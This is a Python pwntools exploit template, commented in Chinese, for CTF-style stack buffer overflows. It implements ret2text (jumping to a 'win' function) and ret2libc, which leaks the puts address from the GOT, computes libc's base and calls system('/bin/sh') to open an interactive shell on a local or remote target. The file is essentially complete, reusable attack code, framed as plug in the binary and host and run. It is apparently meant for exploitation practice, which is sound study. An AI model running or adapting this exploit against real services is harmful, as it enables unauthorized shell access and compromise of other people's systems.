#!/usr/bin/env python3
"""pwn 通用 exploit 模板：ret2text / ret2libc 两种起手式。

改 BIN、LOCAL、HOST/PORT 就能用；先 checksec，再决定走哪条路。
"""
import os
import sys

from pwn import (
    ELF, ROP, context, flat, log, p32, p64, process, remote, u32, u64,
)

context(arch="amd64", os="linux", log_level="info")

BIN = "./vuln"
LIBC = "./libc.so.6"
LOCAL = True
HOST, PORT = "127.0.0.1", 9999
OFFSET = 40                      # buf 大小 + saved rbp，用 cyclic 确认


def start():
    if LOCAL:
        return process(BIN)
    return remote(HOST, PORT)


def ret2text():
    """有后门函数时：覆盖返回地址直接跳过去。"""
    elf = ELF(BIN)
    p = start()

    win = elf.symbols["win"]
    ret = ROP(elf).find_gadget(["ret"])[0]
    log.info(f"win = {hex(win)}, ret = {hex(ret)}")

    # 64 位下 system 需要 16 字节栈对齐，多垫一个 ret
    payload = flat(b"A" * OFFSET, ret, win)
    p.recvuntil(b"input:")
    p.sendline(payload)
    p.interactive()


def ret2libc():
    """没有后门时：泄露 libc，算 system，再打一次。"""
    elf = ELF(BIN)
    libc = ELF(LIBC) if os.path.exists(LIBC) else None
    if libc is None:
        log.warning("no libc.so.6 next to the script, leak will not resolve")
        return

    p = start()
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = rop.find_gadget(["ret"])[0]

    # 第一次：puts(puts@got) 泄露真实地址，然后回到 main
    payload = flat(
        b"A" * OFFSET,
        pop_rdi,
        elf.got["puts"],
        elf.plt["puts"],
        elf.symbols["main"],
    )
    p.recvuntil(b"input:")
    p.sendline(payload)

    leak = u64(p.recvline().strip().ljust(8, b"\x00"))
    base = leak - libc.symbols["puts"]
    system = base + libc.symbols["system"]
    binsh = base + next(libc.search(b"/bin/sh"))
    log.info(f"leak={hex(leak)} base={hex(base)} system={hex(system)}")

    # 第二次：system("/bin/sh")
    payload = flat(b"A" * OFFSET, ret, pop_rdi, binsh, system)
    p.recvuntil(b"input:")
    p.sendline(payload)
    p.interactive()


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "text"
    if mode == "libc":
        ret2libc()
    else:
        ret2text()
